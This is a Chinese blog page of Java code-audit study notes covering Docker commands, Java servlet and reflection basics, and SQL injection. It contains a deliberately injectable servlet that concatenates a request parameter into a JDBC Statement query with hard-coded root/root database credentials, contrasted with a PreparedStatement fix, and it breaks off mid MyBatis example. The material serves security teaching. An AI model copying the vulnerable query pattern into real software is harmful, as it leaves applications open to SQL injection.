<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="Hyy&#39;s Blog">
    <meta name="description" content="title: java代码审计tags:

java安全categories: []author: hyydate: 2023-07-20 06:51:00

docker1234567891011121314151617181920212">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>Hyy&#39;s Blog</title>
    <link rel="icon" type="image/png" href="/favicon.png">
    


    <!-- bg-cover style     -->



<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
<link rel="stylesheet" type="text/css" href="/css/matery.css">
<link rel="stylesheet" type="text/css" href="/css/my.css">
<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">




    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
    <link rel="stylesheet" href="/css/post.css">




    
        <link rel="stylesheet" type="text/css" href="/css/reward.css">
    



    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 6.3.0"></head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Hyy&#39;s Blog</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
  <li>
    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Hyy&#39;s Blog</div>
        <div class="logo-desc">
            
            还只是个玩偶的时候，我就很想上战场了。现在机会来了，我唯一的机会。
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title"></h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                          <div class="article-tag">
                            <span class="chip bg-color">无标签</span>
                          </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2023-07-20
                </div>
                

                

                

                

                
            </div>
        </div>
        <hr class="clearfix">

        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <p>title: java代码审计<br>tags:</p>
<ul>
<li>java安全<br>categories: []<br>author: hyy<br>date: 2023-07-20 06:51:00</li>
</ul>
<h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">windows版本官网安装</span><br><span class="line">setting 有个wsl要注意下不要安装</span><br><span class="line"></span><br><span class="line">docker run ubuntu echo &quot;hello world&quot;		#测试docker安装</span><br><span class="line">docker search tomcat		搜索镜像</span><br><span class="line">docker pull tomcat			下载镜像</span><br><span class="line">docker images				列出本地镜像</span><br><span class="line">docker rmi ubuntu或image ID或container ID		删除镜像</span><br><span class="line">docker run -p 8080:8080 -d dordoka/tomcat</span><br><span class="line">	-d 容器在后台运行</span><br><span class="line">	-p 容器内端口绑定到指定的主机端口</span><br><span class="line">	-P 容器内端口随机映射到主机端口</span><br><span class="line">	-t 提供终端输入</span><br><span class="line">	-i 提供交互</span><br><span class="line">	http://127.0.0.1:8080/host-manager/html</span><br><span class="line">docker ps			#查看容器</span><br><span class="line">	-a 列出所有容器</span><br><span class="line">	-q 仅列出容器id</span><br><span class="line">docker stop dordoka/tmocat或image ID或container ID</span><br><span class="line">docker exec -it fe98 /bin/bash</span><br><span class="line">	exit退出</span><br><span class="line">docker start 标识</span><br><span class="line">docker restart 标识</span><br><span class="line">docker rm 容器id			删除容器</span><br><span class="line">docker cp ./aa.txt fe98:/root/		复制文件</span><br><span class="line"></span><br><span class="line">docker-compose文件存在image镜像配置文件包括端口之类</span><br></pre></td></tr></table></figure>

<h3 id="java基础知识"><a href="#java基础知识" class="headerlink" title="java基础知识"></a>java基础知识</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">访问控制修饰符 default public protected private</span><br><span class="line">非...		final abstract static synchronized</span><br><span class="line"></span><br><span class="line">变量 			局部变量 类变量(静态变量) 成员变量(非静态变量)</span><br><span class="line">数组			存储在堆上 保存多个同类型变量</span><br><span class="line">枚举			限制变量只能在预先设定好的值</span><br><span class="line"></span><br><span class="line">继承			被继承的超类 super class 派生类为子类 subclass</span><br><span class="line">*************java ee分层模型</span><br><span class="line">	Domain Object		java对象组成 包含各自所需的业务逻辑方法</span><br><span class="line">	Data Access Object	数据库访问对象 实现数据库增删改查</span><br><span class="line">	Service				业务逻辑对象组成 系统所需要的业务逻辑方法</span><br><span class="line">	Controller			用于拦截用户请求 调用业务逻辑方法 去处理 结果发给View</span><br><span class="line">	View</span><br><span class="line">	</span><br><span class="line">*************MVC框架简述</span><br><span class="line">	Model View Controller</span><br><span class="line">	servlet API -》 Struts -》 EJB -》 Spring -》 Spring MVC</span><br><span class="line"></span><br><span class="line">1.基础语法掌握</span><br><span class="line">2.看懂代码实现的逻辑</span><br><span class="line">3.各个框架的搭建使用方法</span><br><span class="line">4.快速判断审计项目使用什么框架写的 jar包 看配置 代码引入类</span><br><span class="line"></span><br><span class="line">*************java servlet 核心技术</span><br><span class="line">	web.xml	&lt;?xml ...?&gt; &lt;web-app&gt;</span><br><span class="line">        &lt;servlet&gt;配置入口</span><br><span class="line">            &lt;description&gt;</span><br><span class="line">            &lt;display-name&gt;web应用名字</span><br><span class="line">            &lt;servlet-name&gt;声明servlet名称以便后面映射使用</span><br><span class="line">            &lt;servlet-class&gt;对应类路径</span><br><span class="line">        &lt;servlet-mapping&gt;路径入口</span><br><span class="line">            &lt;servlet-name&gt;上文配置servlet名称</span><br><span class="line">            &lt;url-pattern&gt;组件访问路径</span><br><span class="line">*************java filter 核心技术</span><br><span class="line">	servlet提供filter接口</span><br><span class="line">	对所有web资源管理 实现权限访问控制 过滤敏感词汇 压缩响应信息</span><br><span class="line">	web.xml &lt;?xml ...?&gt; &lt;web-app&gt;</span><br><span class="line">		&lt;filter&gt;</span><br><span class="line">			&lt;filter-name&gt; &lt;filter-class&gt;</span><br><span class="line">		&lt;filter-mapping&gt;</span><br><span class="line">	多个filter web.xml先申明先执行</span><br><span class="line">	</span><br><span class="line">*************java 反射机制</span><br><span class="line">	在静态语⾔中，⼀般对象的类型都是在编译期就确定下来的。⽽通过 Java 反射机制，可以动态的创建对象并调⽤其⽅法和属性</span><br><span class="line">	C/C++ 不存在反射 使运行中的程序能够获取自身的信息 可操作类或对象内部属性</span><br><span class="line">	程序运行时查找对象所属的类 任意一个类的成员变量和方法 构造一个类的对象 调用任意一个对象的方法</span><br><span class="line">	命令执行类</span><br><span class="line">		java.lang.Runtime主要方法getRuntime()返回RUntime类的对象</span><br><span class="line">			Runtime类调用exec()方法执行命令</span><br><span class="line">	获取类的对象方法</span><br><span class="line">		1.Forname() 2.直接获取 3.getClass() 4.getSysClassLoadaer().loadClass()</span><br><span class="line">不安全的反射 无视类方法、变量访问权限修饰符，调用任意类的任意方法、访问并修改成员变量值</span><br><span class="line"></span><br><span class="line">*************类加载</span><br><span class="line">java源文件(xx.java)通过javac编译成字节码文件(xx.class) 再使用类加载器加载到JVM</span><br><span class="line"></span><br><span class="line">加载Load-&gt;Link链接-&gt;Initialize初始化</span><br><span class="line">	将类的.class文件中二进制数据读入内存中，把它放进运行时数据区的方法内，然后在堆区创建java.lang.Class对象</span><br><span class="line">	将创建成的类合并至java虚拟机中，使之能执行的过程</span><br><span class="line">	JVM负责的类进行初始化</span><br><span class="line"></span><br><span class="line">*************动态代理</span><br></pre></td></tr></table></figure>

<h3 id="5-1-sql注入"><a href="#5-1-sql注入" class="headerlink" title="5.1 sql注入"></a>5.1 sql注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">SQL注入的根本原因在于SQL语句的拼接构造。</span><br><span class="line">1. JDBC字符串拼接</span><br><span class="line">JDBC有两种方式执行SQL语句，分别为**PreparedStatement**和**Statement**。</span><br><span class="line">- Statement方法在每次执行时都需要编译</span><br><span class="line">- PreparedStatement会对SQL语句进行预编译，后续无需重新编译</span><br><span class="line">	问号作为占位符</span><br><span class="line">理论上PrepareStatement的效率和安全性会比Statement要好</span><br><span class="line"></span><br><span class="line">2. 框架使用不当造成SQL注入 框架底层有防御机制</span><br><span class="line">Mybatis</span><br><span class="line">	`#`的`$`的区别</span><br><span class="line">        `#`号会点语句进行预编译</span><br><span class="line">        $&#123; &#125; 只是进行string替换，动态解析SQL的时候会进行变量替换**</span><br><span class="line"></span><br><span class="line">指定操作数据库的文件 建立session会话</span><br></pre></td></tr></table></figure>

<h5 id="Statement方法"><a href="#Statement方法" class="headerlink" title="Statement方法"></a>Statement方法</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name=&quot;SQLDemo&quot;,urlPatterns = &quot;/SQLDemo&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SQLDemo</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Connection conn ;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">            conn = DriverManager.getConnection(<span class="string">&quot;jdbc:mysql://localhost:3306/dvwa&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException throwables) &#123;</span><br><span class="line">            throwables.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users where user_id =&quot;</span>+req.getParameter(<span class="string">&quot;id&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;Statement Demo&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;SQL: &quot;</span>+sql);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Statement</span> <span class="variable">st</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> st.executeQuery(sql);</span><br><span class="line">            <span class="keyword">while</span> (rs.next())&#123;</span><br><span class="line">                out.println(<span class="string">&quot;&lt;br&gt;Result: &quot;</span>+ rs.getObject(<span class="string">&quot;user&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException throwables) &#123;</span><br><span class="line">            throwables.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.doGet(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            conn.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException throwables) &#123;</span><br><span class="line">            throwables.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="PreparedStatement"><a href="#PreparedStatement" class="headerlink" title="PreparedStatement"></a>PreparedStatement</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  使用?替代原来的</span></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name=&quot;SQLDemo3&quot;,urlPatterns = &quot;/SQLDemo3&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SQLDemo3</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Connection conn ;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">            conn = DriverManager.getConnection(<span class="string">&quot;jdbc:mysql://localhost:3306/dvwa&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException throwables) &#123;</span><br><span class="line">            throwables.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;prepareStatement Demo3&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users where user_id = ?&quot;</span>;</span><br><span class="line">        out.println(sql);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">PreparedStatement</span> <span class="variable">pstt</span> <span class="operator">=</span> conn.prepareStatement(sql);</span><br><span class="line">            <span class="comment">// 参数已经强制要求是整型</span></span><br><span class="line">            pstt.setInt(<span class="number">1</span>, Integer.parseInt(req.getParameter(<span class="string">&quot;id&quot;</span>)));</span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> pstt.executeQuery();</span><br><span class="line">            <span class="keyword">while</span> (rs.next())&#123;</span><br><span class="line">                out.println(<span class="string">&quot;&lt;br&gt; user_id: &quot;</span>+rs.getObject(<span class="string">&quot;user_id&quot;</span>));</span><br><span class="line">                out.println(<span class="string">&quot;&lt;br&gt; user: &quot;</span>+rs.getObject(<span class="string">&quot;user&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException throwables) &#123;</span><br><span class="line">            throwables.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.doGet(req,resp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            conn.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException throwables) &#123;</span><br><span class="line">            throwables.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="MyBatis"><a href="#MyBatis" class="headerlink" title="MyBatis"></a>MyBatis</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 